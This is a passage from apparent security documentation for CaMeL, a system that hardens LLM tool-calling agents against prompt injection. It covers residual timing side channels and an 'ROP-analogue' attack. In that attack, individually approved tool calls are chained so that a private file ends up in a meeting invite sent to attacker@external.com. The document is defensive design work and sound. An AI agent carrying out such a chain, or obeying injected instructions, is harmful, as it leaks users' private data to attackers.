| **Indirect iteration-count timing** | Medium | A tool-calling loop with an adversary-controlled length still executes N calls. An external observer who can measure total execution time can infer N. M4-F1 prevents policy engine bypass but not external timing observation. |
| **Tool-implementation timing leakage** | Medium | External API calls (email send, calendar create) have variable latency. An adversary who controls tool return values and can observe call timing differences from outside the process can infer private data via differential timing. |
| **CPython instruction-dispatch variance** | Low | CPython's bytecode dispatch has instruction-level timing variation. An adversary with process-level timing instrumentation could theoretically infer branching via instruction count differences. |

**Caveat:** PRD §3.2 NG4 explicitly states: "CaMeL does not guarantee side-channel
immunity in all configurations; timing channels and exception-based channels are
partially mitigated, not eliminated."  The residual timing channels listed above all
require external-observer capabilities (out-of-process timing measurement) that are
outside the threat model scope described in PRD §7.  Deployments in environments
with strict timing-channel requirements should supplement CaMeL with process isolation
(containers, separate VMs) or constant-time tool execution wrappers.

---

### 5.4 L6 — ROP-Analogue Action Chaining

| Field | Value |
|---|---|
| **Risk ID** | L6 |
| **Title** | ROP-analogue action chaining |
| **Severity** | Medium-High |
| **PRD reference** | PRD §10 L6; PRD §12 FW-6 |
| **Mitigation status** | Not addressed in Milestone 4; defence-in-depth countermeasures documented |

**Description:**
A Return-Oriented-Programming (ROP) analogue attack chains individually approved tool
calls — each individually trusted and policy-cleared — to produce a collectively
malicious outcome.  For example:

1. `get_file_contents("resume.pdf")` — Allowed (user's own file, public readers).
2. `summarize(resume_content)` via Q-LLM — Allowed (Q-LLM, no tool access).
3. `create_calendar_event(description=summary)` — Allowed (user-controlled participants).
4. `send_meeting_invite(to="attacker@external.com")` — Allowed if policy approves.

Each step clears policy.  The sequence exfiltrates private file content to an external
address through an indirect chain that no single policy evaluation can detect.

**What Milestone 4 delivers:**
M4-F15 detects direct data-to-control-flow escalation (a single data-derived callable).
It does not detect multi-hop action chains where each individual call is
policy-approved.

**Residual exposure:**
CaMeL's per-call policy enforcement closes the direct exfiltration vectors (a
single `send_email` with untrusted recipient).  Multi-hop sequences require either
a policy that covers the combined output of all calls (which is architecturally
expensive) or model-level training that recognises unusual call sequences.

**Caveat:** This attack class requires the adversary to construct a chain of calls
each of which individually satisfies the platform's security policies — a significantly
higher bar than direct prompt injection.  CaMeL reduces the attack surface
substantially but does not eliminate this class entirely.

**Suggested future work (PRD §12 FW-6):** Research whether dependency graph analysis
can detect ROP-analogue chains by tracking the "effective destination" of a data
value across multiple tool calls.  Anomaly detection on action sequences (unusual
combinations of tools in a single session) is a complementary defence.

---

## Verification Record

All Milestone 4 hardening features were implemented, tested, and documented as of
2026-03-17 (CaMeL v0.4.0).

| Feature Cluster | Features | Tests | Pass Rate |
|---|---|---|---|
| STRICT mode extension | M4-F1 – F5 | 100+ | 100% |
| Exception hardening | M4-F6 – F9, M4-F17 | 50+ | 100% |
| Allowlist enforcement | M4-F10 – F14 | 62 | 100% |
| Escalation detection | M4-F15, M4-F16, M4-F18 | 30+ | 100% |
| Side-channel test suite | All vectors | 89 | 100% |

PRD §11 target — **Side-channel test pass rate: 100% for implemented mitigations** —
is **MET**.  See `docs/reports/milestone4_side_channel_test_report.md` for the
full test execution report.
